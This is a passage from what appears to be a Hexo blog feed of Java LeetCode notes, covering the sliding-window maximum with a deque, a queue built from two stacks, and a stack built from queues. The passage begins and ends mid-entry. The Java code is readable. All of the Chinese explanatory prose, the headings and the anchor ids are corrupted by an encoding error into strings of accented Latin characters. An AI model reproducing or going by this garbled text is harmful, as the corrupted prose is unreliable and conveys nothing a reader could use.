<code>+</code>ã€<code>-</code>ã€<code>*</code>ã€<code>/</code>ï¼‰ï¼Œé›†åˆä¸­ä¹Ÿåªä¼šä¿ç•™ä¸€ä¸ªå®ä¾‹ã€‚å°½ç®¡åœ¨è¿™ä¸ªåœºæ™¯ä¸­å¹¶ä¸ç‰¹åˆ«å…³é”®ï¼Œä½†è¿™ç§ç‰¹æ€§åœ¨å¤„ç†ç‹¬ç‰¹å…ƒç´ æ—¶éå¸¸æœ‰ç”¨.</p><h5 id="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"><a href="#æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼" class="headerlink" title="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"></a><a href="https://so.csdn.net/so/search?q=%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3&spm=1001.2101.3001.7020">æ»‘åŠ¨çª—å£</a>çš„æœ€å¤§å€¼</h5><p>linkï¼š<a href="https://leetcode.cn/problems/sliding-window-maximum/description/">239. æ»‘åŠ¨çª—å£æœ€å¤§å€¼ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h6 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h6><p>çœ‹åˆ°é¢˜ç›®hardä¸è¦ç€æ€¥ï¼Œå°è¯•åˆ†æï¼Œæœ€å¼€å§‹æ¥è§¦çš„æ»‘åŠ¨çª—å£ä¹Ÿæ˜¯ç”¨<strong>åŒç«¯é˜Ÿåˆ—</strong>ã€<code>Deque</code>ï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰åœ¨ Java ä¸­çš„å…¸å‹å®ç°æ˜¯åŸºäº<strong>å¾ªç¯æ•°ç»„</strong>æˆ–<strong>åŒå‘é“¾è¡¨</strong>ã€‘å®ç°ï¼ˆä¸ç”¨æš´åŠ›æ˜¯å› ä¸ºæ—¶é—´å¤æ‚åº¦è‚‰çœ¼å¯è§çš„é«˜ï¼‰é‚£ä¹ˆåœ¨è¿™é‡Œæ˜¯å¦ä¹Ÿå¯ä»¥ç”¨å‘¢ï¼Ÿ<br>æ ¹æ®æ ·ä¾‹åˆ†æå‘ç°è§„å¾‹ï¼šå‡è®¾æ•°ç»„numsé•¿åº¦ä¸ºnï¼Œé‚£ä¹ˆæ»‘åŠ¨çª—å£çš„ç§»åŠ¨æ¬¡æ•°ã€ä¹Ÿå¯ä»¥å«åšç§»åŠ¨èŒƒå›´å§ã€‘ä¸ºn-k+1ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»“æœé›†resçš„é•¿åº¦å°±æ˜¯n-k+1.<br>æœ€åå°±æ˜¯åŒæ ·çš„æ€è·¯è¿›è¡Œç­›é€‰æ¯”è¾ƒéå†å¾—åˆ°ç»“æœ.<br><strong>æ³¨æ„ <code>deque</code> ä¸­å­˜å‚¨çš„æ˜¯æ•°ç»„ <code>nums</code> çš„ç´¢å¼•</strong><br><code>ArrayDeque</code> ä½¿ç”¨ä¸€ä¸ª<strong>åŠ¨æ€å¾ªç¯æ•°ç»„</strong>æ¥å­˜å‚¨å…ƒç´ ï¼Œé€šè¿‡åŠ¨æ€è°ƒæ•´æ•°ç»„å¤§å°æ¥å¤„ç†ç©ºé—´éœ€æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»º </span></span><br><span class="line">        ArrayDeque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//å®šä¹‰res</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">           <span class="comment">//é˜Ÿåˆ—å¤´ç»“ç‚¹éœ€è¦åœ¨[i - k + 1, i]èŒƒå›´å†…ï¼Œä¸ç¬¦åˆåˆ™è¦å¼¹å‡º</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; deque.peek() &lt; i - k + <span class="number">1</span>) &#123;</span><br><span class="line">                deque.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//æ¯”è¾ƒæ–°æ¥çš„å•è¯å’ŒåŸåˆ¤æ–­çš„å•è¯ å¤§äº†æ›´æ–°å°äº†poll</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[deque.peekLast()] &lt; nums[i]) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.offer(i);</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k-<span class="number">1</span>) &#123;</span><br><span class="line">                res[index++] = nums[deque.peek()];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips-1"><a href="#Tips-1" class="headerlink" title="Tips"></a>Tips</h6><h3 id="ä¸ºä»€ä¹ˆä½¿ç”¨ç´¢å¼•è€Œä¸æ˜¯ç›´æ¥å­˜å€¼ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨ç´¢å¼•è€Œä¸æ˜¯ç›´æ¥å­˜å€¼ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ç´¢å¼•è€Œä¸æ˜¯ç›´æ¥å­˜å€¼ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ç´¢å¼•è€Œä¸æ˜¯ç›´æ¥å­˜å€¼ï¼Ÿ</h3><p>ä½¿ç”¨ç´¢å¼•è€Œéç›´æ¥å­˜å€¼æœ‰å‡ ä¸ªå¥½å¤„ï¼š</p><ul><li><strong>ä¿æŒå¯¹åŸå§‹æ•°ç»„çš„å¼•ç”¨</strong>ï¼šå­˜å‚¨ç´¢å¼•å¯ä»¥åœ¨ <code>nums</code> ä¸­è½»æ¾è®¿é—®è¿™äº›å€¼ï¼Œæ— éœ€é¢å¤–çš„å­˜å‚¨ç©ºé—´ã€‚</li><li><strong>ç»´æŠ¤çª—å£çš„æœ‰æ•ˆæ€§</strong>ï¼šåœ¨æ»‘åŠ¨çª—å£ä¸­ç§»åŠ¨æ—¶ï¼Œå¯ä»¥æ ¹æ®ç´¢å¼•æ¥åˆ¤æ–­å…ƒç´ æ˜¯å¦è¶…å‡ºçª—å£èŒƒå›´ï¼ˆå³ <code>deque.peek() &lt; i - k + 1</code>ï¼‰ï¼Œè¿™åœ¨ç›´æ¥å­˜å€¼çš„æƒ…å†µä¸‹è¾ƒéš¾å®ç°ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xd</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xd/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xd/</url>
      
        <content type="html"><![CDATA[<h4 id="ç”¨æ ˆå®ç°é˜Ÿåˆ—"><a href="#ç”¨æ ˆå®ç°é˜Ÿåˆ—" class="headerlink" title="ç”¨æ ˆå®ç°é˜Ÿåˆ—"></a>ç”¨æ ˆå®ç°é˜Ÿåˆ—</h4><p>linkï¼š<a href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. ç”¨æ ˆå®ç°é˜Ÿåˆ— - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é¦–å…ˆç†æ¸…æ¥šæ ˆå’Œé˜Ÿåˆ—çš„å¼‚åŒ.<br>é˜Ÿåˆ—æ˜¯å…ˆè¿›å…ˆå‡º æ ˆå…ˆè¿›åå‡ºã€ä¸¤è€…éƒ½èƒ½å­˜å‚¨å…ƒç´ ã€‘<br>å†æ¥çœ‹peek()å’Œpoll().<br>æ ˆå’Œé˜Ÿåˆ—éƒ½æœ‰peek() å¯ä»¥ç§°ä¹‹ä¸ºâ€œç„ä¸€çœ¼â€åªæ˜¯çœ‹ä¸€ä¸‹å½“å‰æ ˆé¡¶&#x2F;é˜Ÿå¤´å…ƒç´ æ˜¯ä»€ä¹ˆ.<br>æ ˆä¸­çš„pop()ç›´æ¥è¿”å›æ ˆé¡¶å…ƒç´ ï¼ˆå‡ºæ ˆï¼‰<br>é˜Ÿåˆ—ä¸­çš„poll()åœ¨æŸç§å±‚é¢ä¸Šå°±ç­‰æ•ˆäºpop()äº†.</p><p>å…ˆç”¨æ ˆ1å­˜å‚¨æ‰€æœ‰å…ƒç´  å†é€ä¸ªpopåˆ°æ ˆ2ä¸­<br>æœ€åpopæ ˆ2å…¨éƒ¨å…ƒç´ .<br>æ³¨æ„åˆ¤æ–­æ ˆæ»¡ï¼ˆæ˜¯å¦éœ€è¦æ‰©å®¹ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Integer&gt; stack1;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Integer&gt; stack2;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stack1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ•°æ®å…¨éƒ¨å­˜åœ¨stack1ä¸­</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">            stack1.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//ç‰¹æ®Š ä¸¤è€…éƒ½ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="comment">//å…ˆåˆ¤æ–­ç©º stack2ä¸ä¸ºç©ºç›´æ¥pop ç»Ÿä¸€ä»stack2å‡º</span></span><br><span class="line">     <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">      <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">            <span class="comment">//å°†stack1ä¸­çš„å…ƒç´ ä¼ åˆ°stack2ä¸­</span></span><br><span class="line">            stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> stack2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="comment">//ç‰¹æ®Š ä¸¤è€…éƒ½ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="comment">//å…ˆåˆ¤æ–­ç©º stack2ä¸ä¸ºç©ºç›´æ¥pop ç»Ÿä¸€ä»stack2å‡º</span></span><br><span class="line">     <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">      <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">            <span class="comment">//å°†stack1ä¸­çš„å…ƒç´ ä¼ åˆ°stack2ä¸­</span></span><br><span class="line">            stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> stack2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stack1.empty() &amp;&amp; stack2.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    <span class="comment">//åˆ›å»ºéœ€è¦çš„ä¸¤ä¸ªæ ˆ</span></span><br><span class="line">    Stack&lt;Integer&gt; stackIn;</span><br><span class="line">    Stack&lt;Integer&gt; stackOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        stackIn = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stackOut = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="comment">//å…¥æ ˆ        </span></span><br><span class="line">        stackIn.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stackIn.isEmpty() &amp;&amp; stackOut.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpstackIn</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!stackOut.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!stackIn.isEmpty()) &#123;</span><br><span class="line">            stackOut.push(stackIn.pop());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="ç”¨é˜Ÿåˆ—å®ç°æ ˆ"><a href="#ç”¨é˜Ÿåˆ—å®ç°æ ˆ" class="headerlink" title="ç”¨é˜Ÿåˆ—å®ç°æ ˆ"></a>ç”¨é˜Ÿåˆ—å®ç°æ ˆ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/implement-stack-using-queues/description/">225. ç”¨é˜Ÿåˆ—å®ç°æ ˆ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>ç”±äºé˜Ÿåˆ—æ˜¯å…ˆè¿›å…ˆå‡º æƒ³è¦æ¨¡æ‹Ÿæ ˆç¬¬äºŒä¸ªé˜Ÿåˆ—å°±æ˜¯èµ·åˆ°å¤‡ä»½çš„ä½œç”¨.<br>æˆ‘ä»¬è¦è·å–q1æœ€åå…¥åˆ—çš„å…ƒç´  é‚£ä¹ˆå°±éœ€è¦q2ä¸­é—´æ­æ¡¥ï¼š<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241025222720745.png" alt="image-20241025222720745"></p><h6 id="åŒé˜Ÿåˆ—è§£å†³"><a href="#åŒé˜Ÿåˆ—è§£å†³" class="headerlink" title="åŒé˜Ÿåˆ—è§£å†³"></a>åŒé˜Ÿåˆ—è§£å†³</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">      Queue&lt;Integer&gt; queue1;</span><br><span class="line">      Queue&lt;Integer&gt; queue2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">      queue1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">      queue2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        queue2.offer(x);</span><br><span class="line">        <span class="keyword">while</span>(!queue1.isEmpty())&#123;</span><br><span class="line">            queue2.add(queue1.poll());</span><br><span class="line">            <span class="comment">//å…¶å®åœ¨æ— å®¹é‡é™åˆ¶çš„æƒ…å†µä¸‹ä¿æŒä¸€è‡´ä½¿ç”¨offeræˆ–è€…add</span></span><br><span class="line">        &#125;</span><br><span class="line">            Queue&lt;Integer&gt; temp = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">            temp = queue1;</span><br><span class="line">            queue1 = queue2;</span><br><span class="line">            queue2 = temp; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> queue1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h5><p>åœ¨ <code>push</code> æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ <code>offer</code> å’Œ <code>add</code> éƒ½å¯ä»¥å°†å…ƒç´ æ’å…¥åˆ° <code>queue2</code> ä¸­ï¼Œä½†è¿™ä¸¤è€…æœ‰ç»†å¾®çš„åŒºåˆ«ã€‚ä¸‹é¢æ˜¯è§£é‡Šä¸ºä»€ä¹ˆè¿™é‡Œä½¿ç”¨äº† <code>add</code> å’Œ <code>offer</code>ï¼š</p><h3 id="åŒºåˆ«"><a href="#åŒºåˆ«" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h3><ul><li>**<code>offer(E e)</code>**ï¼šç”¨äºå°†å…ƒç´ æ’å…¥åˆ°é˜Ÿåˆ—çš„å°¾éƒ¨ã€‚å¦‚æœé˜Ÿåˆ—æœ‰å®¹é‡é™åˆ¶ï¼ˆå¦‚åœ¨é˜»å¡é˜Ÿåˆ—ä¸­ï¼‰ï¼Œè€Œé˜Ÿåˆ—å·²æ»¡ï¼Œ<code>offer</code> ä¼šè¿”å› <code>false</code>ï¼Œè¡¨ç¤ºæ·»åŠ å¤±è´¥ã€‚</li><li>**<code>add(E e)</code>**ï¼šåŒæ ·å°†å…ƒç´ æ’å…¥åˆ°é˜Ÿåˆ—çš„å°¾éƒ¨ï¼Œä½†å¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼ˆæœ‰å®¹é‡é™åˆ¶æ—¶ï¼‰ï¼Œ<code>add</code> ä¼šæŠ›å‡º <code>IllegalStateException</code>ã€‚</li></ul><p>åœ¨ <code>MyStack</code> å®ç°ä¸­ï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯ <code>LinkedList</code> ä½œä¸ºé˜Ÿåˆ—çš„åº•å±‚å®ç°ï¼Œ<code>LinkedList</code> æœ¬èº«æ²¡æœ‰å®¹é‡é™åˆ¶ï¼Œæ‰€ä»¥åœ¨å®é™…æ“ä½œä¸­ <code>add</code> å’Œ <code>offer</code> çš„è¡Œä¸ºæ˜¯ç›¸åŒçš„ã€‚</p><h3 id="ä¸ºä»€ä¹ˆ-push-ä¸­æ—¢ä½¿ç”¨äº†-offer-åˆä½¿ç”¨äº†-add"><a href="#ä¸ºä»€ä¹ˆ-push-ä¸­æ—¢ä½¿ç”¨äº†-offer-åˆä½¿ç”¨äº†-add" class="headerlink" title="ä¸ºä»€ä¹ˆ push ä¸­æ—¢ä½¿ç”¨äº† offer åˆä½¿ç”¨äº† add"></a>ä¸ºä»€ä¹ˆ <code>push</code> ä¸­æ—¢ä½¿ç”¨äº† <code>offer</code> åˆä½¿ç”¨äº† <code>add</code></h3><ol><li><strong><code>offer</code></strong> ç”¨äºå°†æ–°å…ƒç´  <code>x</code> åŠ å…¥ <code>queue2</code>ã€‚è¿™æ˜¯å› ä¸ºè¿™ä¸ªå…ƒç´ æ˜¯æ–°æ’å…¥çš„ï¼Œå¹¶ä¸”å®ƒæ˜¯æˆ‘ä»¬å¸Œæœ›æœ€ç»ˆåœ¨æ ˆé¡¶éƒ¨çš„å…ƒç´ ã€‚</li><li><strong><code>add</code></strong> ç”¨äºå°† <code>queue1</code> ä¸­å‰©ä½™çš„æ‰€æœ‰å…ƒç´ ç§»åŠ¨åˆ° <code>queue2</code>ã€‚åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­ï¼Œ<code>queue1.poll()</code> ä¼šå°† <code>queue1</code> çš„å…ƒç´ é€ä¸ªå–å‡ºå¹¶æ·»åŠ åˆ° <code>queue2</code>ã€‚è¿™é‡Œä½¿ç”¨ <code>add</code> æˆ– <code>offer</code> éƒ½æ²¡æœ‰å½±å“ï¼Œå› ä¸º <code>LinkedList</code> æ²¡æœ‰å®¹é‡é™åˆ¶ã€‚</li></ol><h6 id="å•é˜Ÿåˆ—è§£å†³"><a href="#å•é˜Ÿåˆ—è§£å†³" class="headerlink" title="å•é˜Ÿåˆ—è§£å†³"></a>å•é˜Ÿåˆ—è§£å†³</h6><p>å…¶å®æœ€å¼€å§‹æ€è€ƒç”¨é˜Ÿåˆ—å®ç°æ ˆæŠŠæœ«å°¾å…¥é˜Ÿçš„å…ƒç´ æ”¾åˆ°é˜Ÿå¤´å³å¯ ä½†æ˜¯æ²¡æœ‰å¯¹çŸ¥è¯†ç‚¹è¿›è¡Œæ¸…æ™°çš„æŒæ¡ ä¸‹é™„å¦™æ‹›.<br><strong>Dequeç»§æ‰¿äº†Queueæ¥å£</strong><br><strong>Queue ä¸­çš„ addã€pollã€peekç­‰æ•ˆäº Deque ä¸­çš„ addLastã€pollFirstã€peekFirst</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">    Deque&lt;Integer&gt; que1;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">        que1 = <span class="keyword">new</span> 